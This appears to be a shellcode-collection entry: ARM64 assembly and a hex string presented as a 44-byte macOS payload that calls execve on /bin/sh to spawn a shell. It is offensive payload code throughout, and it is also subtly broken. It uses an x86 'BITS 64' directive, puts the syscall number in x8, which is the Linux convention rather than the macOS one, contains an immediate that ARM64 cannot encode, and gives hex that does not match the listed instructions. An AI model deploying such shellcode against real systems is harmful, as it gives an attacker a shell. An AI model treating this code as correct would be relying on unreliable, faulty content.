; Title:    macOS ARM64 execve /bin/sh
; Platform: macos
; Arch:     arm64
; Size:     44 bytes
; Encoding: raw
;
; Assembled hex:
; \xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x80\xd2\xe1\x66\x02\xa9\xe0\x03\x00\x91\x02\x00\x80\xd2\x01\x10\x80\xd2\xa8\x1b\x80\xd2\x01\x00\x00\xd4

BITS 64
global _start

_start:
    ; execve("/bin/sh", NULL, NULL) for macOS ARM64
    mov     x1, xzr             ; argv = NULL
    mov     x2, xzr             ; envp = NULL
    mov     x0, xzr             ; result placeholder
    ; Build "/bin/sh" on stack
    mov     x8, 0x2f62696e     ; "/bin"
    movk    x8, 0x2f73, lsl#32 ; "/s"
    movk    x8, 0x68, lsl#48   ; "h"
    stp     x8, xzr, [sp, #-16]!
    mov     x0, sp              ; x0 = "/bin/sh"
    ; macOS ARM64 syscall: execve = 0x200003b
    mov     x2, #0              ; envp
    mov     x1, #0              ; argv (simplified)
    mov     x8, #0x3b
    movk    x8, #0x2000, lsl#16
    svc     #0x80
